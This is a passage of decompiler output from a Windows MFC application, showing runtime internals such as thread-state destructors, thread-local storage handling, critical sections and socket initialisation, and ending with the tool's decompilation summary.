    (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 16))(v2);
  result = (HKEY)this[45];
  if ( result )
    return sub_41AAE0((int)this, "Settings", "PreviewPages", this[45]);
  return result;
}

//----- (0041B283) --------------------------------------------------------
char **sub_41B283()
{
  return &off_41F208;
}
// 41F208: using guessed type char *off_41F208;

//----- (0041B289) --------------------------------------------------------
int sub_41B289()
{
  nullsub_12();
  return atexit(sub_41B2A0);
}
// 41B293: using guessed type int nullsub_12(void);

//----- (0041B2A0) --------------------------------------------------------
void __cdecl sub_41B2A0()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&unk_442828);
}

//----- (0041B2AA) --------------------------------------------------------
struct CNoTrackObject *__stdcall sub_41B2AA()
{
  _DWORD *v0; // ecx
  struct CNoTrackObject *result; // eax

  v0 = CNoTrackObject::operator new(0x3Cu);
  result = 0;
  if ( v0 )
    return (struct CNoTrackObject *)sub_41B893(v0);
  return result;
}

//----- (0041B2DB) --------------------------------------------------------
CWinThread *__thiscall sub_41B2DB(CWinThread *lpMem, char a2)
{
  CWinThread::~CWinThread(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0041B366) --------------------------------------------------------
char **sub_41B366()
{
  return &off_41F358;
}
// 41F358: using guessed type char *off_41F358;

//----- (0041B3B5) --------------------------------------------------------
struct CNoTrackObject *__stdcall sub_41B3B5()
{
  struct CNoTrackObject *result; // eax

  result = (struct CNoTrackObject *)CNoTrackObject::operator new(4u);
  if ( !result )
    return 0;
  *(_DWORD *)result = &_AFX_CTL3D_THREAD::`vftable';
  return result;
}
// 41F408: using guessed type void *_AFX_CTL3D_THREAD::`vftable';

//----- (0041B3CA) --------------------------------------------------------
_DWORD *__thiscall sub_41B3CA(_DWORD *hMem, char a2)
{
  sub_41C564(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041B3E5) --------------------------------------------------------
_DWORD *__thiscall sub_41B3E5(_DWORD *hMem, char a2)
{
  sub_41C5A5(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041B4E0) --------------------------------------------------------
char **sub_41B4E0()
{
  return &off_41F5D0;
}
// 41F5D0: using guessed type char *off_41F5D0;

//----- (0041B4E6) --------------------------------------------------------
int sub_41B4E6()
{
  unknown_libname_34();
  return atexit(sub_41B50E);
}
// 41B4F0: using guessed type int unknown_libname_34(void);

//----- (0041B50E) --------------------------------------------------------
void __cdecl sub_41B50E()
{
  sub_409E68(dword_442980);
}
// 442980: using guessed type _DWORD dword_442980[38];

//----- (0041B518) --------------------------------------------------------
char **sub_41B518()
{
  return &off_41F5A8;
}
// 41F5A8: using guessed type char *off_41F5A8;

//----- (0041B51E) --------------------------------------------------------
int sub_41B51E()
{
  unknown_libname_35();
  return atexit(sub_41B546);
}
// 41B528: using guessed type int unknown_libname_35(void);

//----- (0041B546) --------------------------------------------------------
void __cdecl sub_41B546()
{
  sub_409EB5(dword_4428E8);
}
// 4428E8: using guessed type _DWORD dword_4428E8[38];

//----- (0041B567) --------------------------------------------------------
void ***sub_41B567()
{
  return &off_41F588;
}
// 41F588: using guessed type void **off_41F588;

//----- (0041B587) --------------------------------------------------------
char **sub_41B587()
{
  return &off_41F560;
}
// 41F560: using guessed type char *off_41F560;

//----- (0041B5B3) --------------------------------------------------------
unsigned int *__thiscall sub_41B5B3(unsigned int *this, char a2)
{
  sub_41B5D3(this);
  if ( (a2 & 1) != 0 )
    sub_40A5C5((int)&unk_442A40, this);
  return this;
}

//----- (0041B5D8) --------------------------------------------------------
char **sub_41B5D8()
{
  return &off_41F540;
}
// 41F540: using guessed type char *off_41F540;

//----- (0041B5FA) --------------------------------------------------------
unsigned int *__thiscall sub_41B5FA(unsigned int *this, char a2)
{
  sub_41B61A(this);
  if ( (a2 & 1) != 0 )
    sub_40A5C5((int)&unk_442A18, this);
  return this;
}

//----- (0041B61A) --------------------------------------------------------
BOOL __thiscall sub_41B61A(unsigned int *this)
{
  *this = (unsigned int)&CGdiObject::`vftable';
  return sub_41A013(this);
}
// 41F678: using guessed type void *CGdiObject::`vftable';

//----- (0041B643) --------------------------------------------------------
char **sub_41B643()
{
  return &off_41F518;
}
// 41F518: using guessed type char *off_41F518;

//----- (0041B649) --------------------------------------------------------
int sub_41B649()
{
  sub_41B653();
  return atexit(unknown_libname_36);
}

//----- (0041B653) --------------------------------------------------------
char *sub_41B653()
{
  return sub_40A4D2(byte_442A40, 16, 64);
}

//----- (0041B689) --------------------------------------------------------
int sub_41B689()
{
  sub_41B693();
  return atexit(unknown_libname_37);
}

//----- (0041B693) --------------------------------------------------------
char *sub_41B693()
{
  return sub_40A4D2(byte_442A18, 8, 64);
}

//----- (0041B6E0) --------------------------------------------------------
char *__thiscall sub_41B6E0(char *hMem, char a2)
{
  sub_41B6FB(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041B6FB) --------------------------------------------------------
void __thiscall sub_41B6FB(char *this)
{
  int v2; // ecx
  _DWORD *v3; // edi
  void *v4; // esi

  *(_DWORD *)this = &_AFX_THREAD_STATE::`vftable';
  v2 = *((_DWORD *)this + 51);
  v3 = this + 204;
  if ( v2 )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 88))(v2);
    if ( *v3 )
      (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)*v3 + 4))(*v3, 1);
  }
  if ( *((_DWORD *)this + 12) )
    UnhookWindowsHookEx(*((HHOOK *)this + 12));
  if ( *((_DWORD *)this + 11) )
    UnhookWindowsHookEx(*((HHOOK *)this + 11));
  v4 = (void *)*((_DWORD *)this + 3);
  if ( v4 )
    sub_40AD16(v4);
}
// 41F740: using guessed type void *_AFX_THREAD_STATE::`vftable';

//----- (0041B77F) --------------------------------------------------------
int sub_41B77F()
{
  nullsub_13();
  return atexit(sub_41B796);
}
// 41B789: using guessed type int nullsub_13(void);

//----- (0041B796) --------------------------------------------------------
void __cdecl sub_41B796()
{
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)&unk_442A6C);
}

//----- (0041B803) --------------------------------------------------------
_DWORD *__thiscall sub_41B803(_DWORD *hMem, char a2)
{
  sub_41B81E(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041B81E) --------------------------------------------------------
void __thiscall sub_41B81E(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // ecx
  _DWORD *v4; // edi

  *this = &AFX_MODULE_STATE::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[1041];
  if ( v2 )
    (**v2)(v2, 1);
  v3 = this[1051];
  v4 = this + 1051;
  if ( v3 )
  {
    (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v3 + 12))(v3, this + 1042);
    if ( *v4 )
      (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)*v4 + 4))(*v4, 1);
  }
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)(this + 1052));
}
// 41F748: using guessed type void *AFX_MODULE_STATE::`vftable';

//----- (0041B893) --------------------------------------------------------
_DWORD *__thiscall sub_41B893(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[2] = 0;
  this[3] = 0;
  *this = &AFX_MODULE_THREAD_STATE::`vftable';
  this[3] = 84;
  this[10] = sub_416645;
  return result;
}
// 416645: using guessed type void __noreturn sub_416645();
// 41F750: using guessed type void *AFX_MODULE_THREAD_STATE::`vftable';

//----- (0041B8B2) --------------------------------------------------------
_DWORD *__thiscall sub_41B8B2(_DWORD *hMem, char a2)
{
  sub_41B8CD(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041B8CD) --------------------------------------------------------
void __thiscall sub_41B8CD(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  void (__thiscall ***v3)(_DWORD, int); // ecx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  void (__thiscall ***v5)(_DWORD, int); // ecx
  void (__thiscall ***v6)(_DWORD, int); // ecx
  _DWORD *v7; // ecx
  void *v8; // eax
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx

  *this = &AFX_MODULE_THREAD_STATE::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[5];
  if ( v2 )
    (**v2)(v2, 1);
  v3 = (void (__thiscall ***)(_DWORD, int))this[6];
  if ( v3 )
    (**v3)(v3, 1);
  v4 = (void (__thiscall ***)(_DWORD, int))this[7];
  if ( v4 )
    (**v4)(v4, 1);
  v5 = (void (__thiscall ***)(_DWORD, int))this[8];
  if ( v5 )
    (**v5)(v5, 1);
  v6 = (void (__thiscall ***)(_DWORD, int))this[9];
  if ( v6 )
    (**v6)(v6, 1);
  v7 = (_DWORD *)this[14];
  if ( v7 )
  {
    while ( v7[3] )
    {
      v8 = (void *)sub_4156EE(v7);
      sub_416688(v8);
      v7 = (_DWORD *)this[14];
    }
  }
  v9 = this[12];
  if ( v9 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v9 + 4))(v9, 1);
  v10 = this[13];
  if ( v10 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v10 + 4))(v10, 1);
  v11 = this[14];
  if ( v11 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v11 + 4))(v11, 1);
}
// 41F750: using guessed type void *AFX_MODULE_THREAD_STATE::`vftable';

//----- (0041B97B) --------------------------------------------------------
int sub_41B97B()
{
  nullsub_14();
  return atexit(sub_41B992);
}
// 41B985: using guessed type int nullsub_14(void);

//----- (0041B992) --------------------------------------------------------
void __cdecl sub_41B992()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&unk_442A68);
}

//----- (0041BA36) --------------------------------------------------------
_DWORD *__thiscall sub_41BA36(_DWORD *hMem, char a2)
{
  sub_41BA51(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041BA6D) --------------------------------------------------------
char **sub_41BA6D()
{
  return &off_426888;
}
// 426888: using guessed type char *off_426888;

//----- (0041BA78) --------------------------------------------------------
void sub_41BA78()
{
  sub_416CCA(&off_426888);
}
// 426888: using guessed type char *off_426888;

//----- (0041BA83) --------------------------------------------------------
char **sub_41BA83()
{
  return &off_41F7A8;
}
// 41F7A8: using guessed type char *off_41F7A8;

//----- (0041BA89) --------------------------------------------------------
char **sub_41BA89()
{
  return &off_41F820;
}
// 41F820: using guessed type char *off_41F820;

//----- (0041BA8F) --------------------------------------------------------
int sub_41BA8F()
{
  unknown_libname_38();
  return atexit(sub_41BAB7);
}
// 41BA99: using guessed type int unknown_libname_38(void);

//----- (0041BAB7) --------------------------------------------------------
void __cdecl sub_41BAB7()
{
  sub_40A16E(dword_442B10);
}
// 442B10: using guessed type _DWORD dword_442B10[38];

//----- (0041BAC1) --------------------------------------------------------
char **sub_41BAC1()
{
  return &off_41F7F0;
}
// 41F7F0: using guessed type char *off_41F7F0;

//----- (0041BAC7) --------------------------------------------------------
int sub_41BAC7()
{
  unknown_libname_39();
  return atexit(sub_41BAEF);
}
// 41BAD1: using guessed type int unknown_libname_39(void);

//----- (0041BAEF) --------------------------------------------------------
void __cdecl sub_41BAEF()
{
  sub_40A1BB(dword_442A78);
}
// 442A78: using guessed type _DWORD dword_442A78[38];

//----- (0041BAF9) --------------------------------------------------------
int sub_41BAF9()
{
  nullsub_15();
  return atexit(sub_41BB10);
}
// 41BB03: using guessed type int nullsub_15(void);

//----- (0041BB10) --------------------------------------------------------
void __cdecl sub_41BB10()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&unk_442BA8);
}

//----- (0041BB2F) --------------------------------------------------------
int sub_41BB2F()
{
  sub_41BB39();
  return atexit(sub_41BB4F);
}

//----- (0041BB39) --------------------------------------------------------
int sub_41BB39()
{
  return sub_41AEBF((int)&unk_442BB0);
}

//----- (0041BB4F) --------------------------------------------------------
void __cdecl sub_41BB4F()
{
  sub_41AF2A((int)&unk_442BB0);
}

//----- (0041BB6C) --------------------------------------------------------
int __thiscall sub_41BB6C(int *this, int a2)
{
  int v2; // edx
  int result; // eax
  int v4; // ecx
  int v5; // edi

  v2 = *this;
  if ( !*this )
    return 0;
  result = 0;
  if ( v2 == a2 )
  {
    *this = *(_DWORD *)(this[1] + a2);
    return 1;
  }
  if ( v2 )
  {
    v4 = this[1];
    do
    {
      v5 = *(_DWORD *)(v4 + v2);
      if ( v5 == a2 )
        break;
      v2 = *(_DWORD *)(v4 + v2);
    }
    while ( v5 );
    if ( v2 )
    {
      *(_DWORD *)(v4 + v2) = *(_DWORD *)(v4 + a2);
      return 1;
    }
  }
  return result;
}

//----- (0041BC7D) --------------------------------------------------------
int __thiscall sub_41BC7D(int this)
{
  int v2; // ebp
  int v3; // edi
  _BYTE *v4; // eax
  const void *v5; // eax
  int v6; // ebp
  HGLOBAL v7; // eax
  HGLOBAL v8; // ebx
  HGLOBAL v9; // eax
  char *v10; // ebx
  int v12; // [esp-4h] [ebp-18h]
  struct _RTL_CRITICAL_SECTION *lpCriticalSection; // [esp+10h] [ebp-4h]

  lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(this + 28);
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 28));
  v2 = *(_DWORD *)(this + 4);
  v3 = *(_DWORD *)(this + 8);
  if ( v3 >= v2 || (*(_BYTE *)(*(_DWORD *)(this + 16) + 8 * v3) & 1) != 0 )
  {
    v3 = 1;
    if ( v2 <= 1 )
      goto LABEL_8;
    v4 = (_BYTE *)(*(_DWORD *)(this + 16) + 8);
    do
    {
      if ( (*v4 & 1) == 0 )
        break;
      ++v3;
      v4 += 8;
    }
    while ( v3 < v2 );
    if ( v3 >= v2 )
    {
LABEL_8:
      v5 = *(const void **)(this + 16);
      v6 = v2 + 32;
      if ( v5 )
      {
        v8 = GlobalHandle(v5);
        GlobalUnlock(v8);
        v7 = GlobalReAlloc(v8, 8 * v6, 0x2002u);
      }
      else
      {
        v7 = GlobalAlloc(0x2002u, 8 * v6);
      }
      if ( !v7 )
      {
        v9 = GlobalHandle(*(LPCVOID *)(this + 16));
        GlobalLock(v9);
        LeaveCriticalSection(lpCriticalSection);
        sub_41535F(v12);
      }
      v10 = (char *)GlobalLock(v7);
      memset(&v10[8 * *(_DWORD *)(this + 4)], 0, 8 * (v6 + 0x1FFFFFFF * *(_DWORD *)(this + 4)));
      *(_DWORD *)(this + 16) = v10;
      *(_DWORD *)(this + 4) = v6;
    }
  }
  if ( v3 >= *(_DWORD *)(this + 12) )
    *(_DWORD *)(this + 12) = v3 + 1;
  *(_DWORD *)(*(_DWORD *)(this + 16) + 8 * v3) |= 1u;
  *(_DWORD *)(this + 8) = v3 + 1;
  LeaveCriticalSection(lpCriticalSection);
  return v3;
}
// 41BD2F: variable 'v12' is possibly undefined

//----- (0041BDEC) --------------------------------------------------------
int __thiscall sub_41BDEC(int this, int a2, int a3)
{
  _DWORD *Value; // edi
  _DWORD *v5; // ebx
  _DWORD *v6; // eax
  void *v7; // eax
  HLOCAL v8; // eax
  int result; // eax
  int v10; // [esp+0h] [ebp-10h]

  Value = TlsGetValue(*(_DWORD *)this);
  if ( Value )
  {
    v5 = Value + 2;
    if ( a2 < Value[2] || !a3 )
      goto LABEL_15;
  }
  else
  {
    v6 = CNoTrackObject::operator new(0x10u);
    if ( v6 )
    {
      *v6 = &CThreadData::`vftable';
      Value = v6;
    }
    else
    {
      Value = 0;
    }
    Value[2] = 0;
    Value[3] = 0;
    v5 = Value + 2;
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 28));
    CSimpleList::AddHead((CSimpleList *)(this + 20), Value);
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 28));
  }
  v7 = (void *)Value[3];
  if ( v7 )
    v8 = LocalReAlloc(v7, 4 * *(_DWORD *)(this + 12), 2u);
  else
    v8 = LocalAlloc(0, 4 * *(_DWORD *)(this + 12));
  Value[3] = v8;
  if ( !v8 )
    sub_41535F(v10);
  memset((void *)(Value[3] + 4 * *v5), 0, 4 * (*(_DWORD *)(this + 12) + 0x3FFFFFFF * *v5));
  *v5 = *(_DWORD *)(this + 12);
  TlsSetValue(*(_DWORD *)this, Value);
LABEL_15:
  result = Value[3];
  *(_DWORD *)(result + 4 * a2) = a3;
  return result;
}
// 41BE8E: variable 'v10' is possibly undefined
// 41F934: using guessed type void *CThreadData::`vftable';

//----- (0041BED6) --------------------------------------------------------
HLOCAL __thiscall sub_41BED6(HLOCAL hMem, char a2)
{
  nullsub_2();
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}
// 41BEF1: using guessed type int nullsub_2(void);

//----- (0041BEF2) --------------------------------------------------------
int __thiscall sub_41BEF2(int this, int a2, int a3)
{
  int v4; // edi
  int result; // eax
  void (__thiscall ***v6)(_DWORD, int); // ecx
  int v7; // [esp+Ch] [ebp-4h]

  v4 = 1;
  v7 = 1;
  if ( *(int *)(a2 + 8) <= 1 )
    goto LABEL_11;
  do
  {
    if ( !a3 || *(_DWORD *)(*(_DWORD *)(this + 16) + 8 * v4 + 4) == a3 )
    {
      v6 = *(void (__thiscall ****)(_DWORD, int))(*(_DWORD *)(a2 + 12) + 4 * v4);
      if ( v6 )
        (**v6)(v6, 1);
      result = *(_DWORD *)(a2 + 12);
      *(_DWORD *)(result + 4 * v4) = 0;
    }
    else
    {
      result = *(_DWORD *)(a2 + 12);
      if ( *(_DWORD *)(result + 4 * v4) )
        v7 = 0;
    }
    ++v4;
  }
  while ( v4 < *(_DWORD *)(a2 + 8) );
  if ( v7 )
  {
LABEL_11:
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 28));
    sub_41BB6C((int *)(this + 20), a2);
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 28));
    LocalFree(*(HLOCAL *)(a2 + 12));
    if ( a2 )
      (**(void (__thiscall ***)(int, int))a2)(a2, 1);
    return TlsSetValue(*(_DWORD *)this, 0);
  }
  return result;
}

//----- (0041C079) --------------------------------------------------------
int __thiscall sub_41C079(void *this, int (*a2)(void))
{
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  if ( !*(_DWORD *)this )
  {
    sub_41C3BC(16);
    v5 = 0;
    if ( !*(_DWORD *)this )
      *(_DWORD *)this = a2();
    v5 = -1;
    AfxUnlockGlobals(16);
  }
  return *(_DWORD *)this;
}

//----- (0041C247) --------------------------------------------------------
char **sub_41C247()
{
  return &off_41F980;
}
// 41F980: using guessed type char *off_41F980;

//----- (0041C24D) --------------------------------------------------------
_DWORD *sub_41C24D()
{
  _DWORD *v0; // esi
  _DWORD *result; // eax

  v0 = sub_40A536(byte_444430);
  result = 0;
  if ( v0 )
  {
    sub_417051(v0);
    *v0 = &CTempWnd::`vftable';
    return v0;
  }
  return result;
}
// 41FE4C: using guessed type void *CTempWnd::`vftable';

//----- (0041C28D) --------------------------------------------------------
CWnd *__thiscall sub_41C28D(CWnd *this, char a2)
{
  CWnd::~CWnd(this);
  if ( (a2 & 1) != 0 )
    sub_40A5C5((int)byte_444430, this);
  return this;
}

//----- (0041C2B2) --------------------------------------------------------
char **sub_41C2B2()
{
  return &off_41F958;
}
// 41F958: using guessed type char *off_41F958;

//----- (0041C2B8) --------------------------------------------------------
int sub_41C2B8()
{
  sub_41C2C2();
  return atexit(unknown_libname_40);
}

//----- (0041C2C2) --------------------------------------------------------
char *sub_41C2C2()
{
  return sub_40A4D2(byte_444430, 60, 64);
}

//----- (0041C2F8) --------------------------------------------------------
_DWORD *sub_41C2F8()
{
  _DWORD *v0; // ecx
  _DWORD *result; // eax

  v0 = CNoTrackObject::operator new(0x10u);
  result = 0;
  if ( v0 )
    return sub_41AF79(v0);
  return result;
}

//----- (0041C329) --------------------------------------------------------
int sub_41C329()
{
  signed int Version; // eax

  if ( !dword_44476C )
  {
    dword_44476C = 1;
    Version = GetVersion();
    if ( (unsigned __int8)Version >= 4u || Version >= 0 )
    {
      dword_444768 = 0;
      InitializeCriticalSection(&stru_4445B8);
    }
    else
    {
      dword_444768 = 1;
    }
  }
  return dword_44476C;
}
// 444768: using guessed type int dword_444768;
// 44476C: using guessed type int dword_44476C;

//----- (0041C36E) --------------------------------------------------------
void sub_41C36E()
{
  int *v0; // esi
  struct _RTL_CRITICAL_SECTION *v1; // ebx

  if ( dword_44476C )
  {
    --dword_44476C;
    if ( !dword_444768 )
    {
      DeleteCriticalSection(&stru_4445B8);
      v0 = &dword_444574;
      v1 = &stru_4445D0;
      do
      {
        if ( *v0 )
        {
          DeleteCriticalSection(v1);
          --*v0;
        }
        ++v1;
        ++v0;
      }
      while ( (int)v1 < (int)&dword_444768 );
    }
  }
}
// 444574: using guessed type int dword_444574;
// 444768: using guessed type int dword_444768;
// 44476C: using guessed type int dword_44476C;

//----- (0041C3BC) --------------------------------------------------------
void __stdcall sub_41C3BC(int a1)
{
  if ( !dword_44476C )
    sub_41C329();
  if ( !dword_444768 )
  {
    if ( !dword_444574[a1] )
    {
      EnterCriticalSection(&stru_4445B8);
      if ( !dword_444574[a1] )
      {
        InitializeCriticalSection((LPCRITICAL_SECTION)(24 * a1 + 4474320));
        ++dword_444574[a1];
      }
      LeaveCriticalSection(&stru_4445B8);
    }
    EnterCriticalSection((LPCRITICAL_SECTION)(24 * a1 + 4474320));
  }
}
// 444574: using guessed type int dword_444574[17];
// 444768: using guessed type int dword_444768;
// 44476C: using guessed type int dword_44476C;

//----- (0041C44D) --------------------------------------------------------
int sub_41C44D()
{
  sub_41C457();
  return atexit(sub_41C46D);
}

//----- (0041C457) --------------------------------------------------------
AUX_DATA *sub_41C457()
{
  return AUX_DATA::AUX_DATA((AUX_DATA *)&dword_444770);
}
// 444770: using guessed type int dword_444770;

//----- (0041C46D) --------------------------------------------------------
void __cdecl sub_41C46D()
{
  AfxDeleteObject((void **)&dword_444770 + 20);
}
// 444770: using guessed type int dword_444770;

//----- (0041C564) --------------------------------------------------------
int (__stdcall *__thiscall sub_41C564(_DWORD *this))(_DWORD)
{
  int (__stdcall *result)(_DWORD); // eax
  HMODULE v3; // esi

  *this = &_AFX_CTL3D_STATE::`vftable';
  result = (int (__stdcall *)(_DWORD))this[4];
  if ( result )
    result = (int (__stdcall *)(_DWORD))result(0);
  v3 = (HMODULE)this[2];
  if ( v3 )
    return (int (__stdcall *)(_DWORD))FreeLibrary(v3);
  return result;
}
// 41F400: using guessed type void *_AFX_CTL3D_STATE::`vftable';

//----- (0041C5A5) --------------------------------------------------------
int (__cdecl *__thiscall sub_41C5A5(_DWORD *this))(_DWORD *)
{
  int (__cdecl *result)(_DWORD *); // eax

  *this = &_AFX_CTL3D_THREAD::`vftable';
  result = (int (__cdecl *)(_DWORD *))dword_4447E0;
  if ( dword_4447E0 )
  {
    result = *(int (__cdecl **)(_DWORD *))(dword_4447E0 + 24);
    if ( result )
      return (int (__cdecl *)(_DWORD *))result(this);
  }
  return result;
}
// 41F408: using guessed type void *_AFX_CTL3D_THREAD::`vftable';

//----- (0041C5DB) --------------------------------------------------------
int sub_41C5DB()
{
  nullsub_16();
  return atexit(sub_41C5F2);
}
// 41C5E5: using guessed type int nullsub_16(void);

//----- (0041C5F2) --------------------------------------------------------
void __cdecl sub_41C5F2()
{
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)&unk_4447DC);
}

//----- (0041C601) --------------------------------------------------------
int sub_41C601()
{
  nullsub_17();
  return atexit(sub_41C618);
}
// 41C60B: using guessed type int nullsub_17(void);

//----- (0041C618) --------------------------------------------------------
void __cdecl sub_41C618()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&dword_4447E0);
}

//----- (0041C627) --------------------------------------------------------
char **sub_41C627()
{
  return &off_41FF10;
}
// 41FF10: using guessed type char *off_41FF10;

//----- (0041C62D) --------------------------------------------------------
char **sub_41C62D()
{
  return &off_41FF48;
}
// 41FF48: using guessed type char *off_41FF48;

//----- (0041C809) --------------------------------------------------------
char **sub_41C809()
{
  return &off_41FF90;
}
// 41FF90: using guessed type char *off_41FF90;

//----- (0041C80F) --------------------------------------------------------
char **sub_41C80F()
{
  return &off_41FFA8;
}
// 41FFA8: using guessed type char *off_41FFA8;

//----- (0041C83D) --------------------------------------------------------
int sub_41C83D()
{
  int result; // eax

  result = AfxInitDBCS();
  dword_4447E4 = result;
  return result;
}
// 4447E4: using guessed type int dword_4447E4;

//----- (0041C862) --------------------------------------------------------
char **sub_41C862()
{
  return &off_420028;
}
// 420028: using guessed type char *off_420028;

//----- (0041C884) --------------------------------------------------------
unsigned int *__thiscall sub_41C884(unsigned int *this, char a2)
{
  sub_41C8A4(this);
  if ( (a2 & 1) != 0 )
    sub_40A5C5((int)&unk_4447F0, this);
  return this;
}

//----- (0041C8A4) --------------------------------------------------------
BOOL __thiscall sub_41C8A4(unsigned int *this)
{
  *this = (unsigned int)&off_42004C;
  return sub_419A1A(this);
}
// 42004C: using guessed type int (*off_42004C)();

//----- (0041C8CD) --------------------------------------------------------
char **sub_41C8CD()
{
  return &off_420000;
}
// 420000: using guessed type char *off_420000;

//----- (0041C8D3) --------------------------------------------------------
int sub_41C8D3()
{
  sub_41C8DD();
  return atexit(unknown_libname_41);
}

//----- (0041C8DD) --------------------------------------------------------
char *sub_41C8DD()
{
  return sub_40A4D2(byte_4447F0, 8, 64);
}

//----- (0041C913) --------------------------------------------------------
void *__thiscall sub_41C913(_DWORD *this)
{
  void *result; // eax
  int (__cdecl *v2)(_DWORD *); // ecx

  result = &loc_41D29C;
  *this = &_AFX_SOCK_STATE::`vftable';
  v2 = (int (__cdecl *)(_DWORD *))this[3];
  if ( v2 )
    return (void *)v2(this);
  return result;
}
// 41F8B4: using guessed type void *_AFX_SOCK_STATE::`vftable';

//----- (0041C940) --------------------------------------------------------
_DWORD *__thiscall sub_41C940(_DWORD *hMem, char a2)
{
  sub_41C913(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041C98D) --------------------------------------------------------
int __stdcall sub_41C98D(char *lpWSAData)
{
  int v1; // edi
  char *v2; // esi
  struct AFX_MODULE_THREAD_STATE *ModuleThreadState; // esi
  _DWORD *v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v9; // ecx
  _DWORD *v10; // eax
  char v11; // [esp+Ch] [ebp-19Ch] BYREF
  int v12; // [esp+1A4h] [ebp-4h]

  v1 = sub_41C079(&unk_442BA8, CProcessLocal<_AFX_SOCK_STATE>::CreateObject);
  if ( *(_DWORD *)(v1 + 12) )
    goto LABEL_8;
  v2 = lpWSAData;
  if ( !lpWSAData )
    v2 = &v11;
  if ( WSAStartup(0x101u, (LPWSADATA)v2) )
    return 0;
  if ( *v2 != 1 || v2[1] != 1 )
  {
    WSACleanup();
    return 0;
  }
  *(_DWORD *)(v1 + 12) = AfxSocketTerm;
LABEL_8:
  ModuleThreadState = AfxGetModuleThreadState();
  if ( !*((_DWORD *)ModuleThreadState + 12) )
  {
    v4 = sub_41665F(0x1Cu);
    v12 = 0;
    if ( v4 )
      v5 = sub_415748(v4, 10);
    else
      v5 = 0;
    v12 = -1;
    *((_DWORD *)ModuleThreadState + 12) = v5;
  }
  if ( !*((_DWORD *)ModuleThreadState + 13) )
  {
    v7 = sub_41665F(0x1Cu);
    v12 = 1;
    if ( v7 )
      v8 = sub_415748(v7, 10);
    else
      v8 = 0;
    v12 = -1;
    *((_DWORD *)ModuleThreadState + 13) = v8;
  }
  if ( !*((_DWORD *)ModuleThreadState + 14) )
  {
    v9 = sub_41665F(0x1Cu);
    v12 = 2;
    if ( v9 )
      v10 = sub_41564D(v9, 10);
    else
      v10 = 0;
    *((_DWORD *)ModuleThreadState + 14) = v10;
  }
  return 1;
}
// 41BB1A: using guessed type int CProcessLocal<_AFX_SOCK_STATE>::CreateObject();

//----- (0041CA92) --------------------------------------------------------
void __thiscall sub_41CA92(void **this)
{
  *this = &_AFX_WIN_STATE::`vftable';
  AfxDeleteObject(this + 1);
}
// 41F2B0: using guessed type void *_AFX_WIN_STATE::`vftable';

// nfuncs=1053 queued=548 decompiled=548 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 548 function(s)"
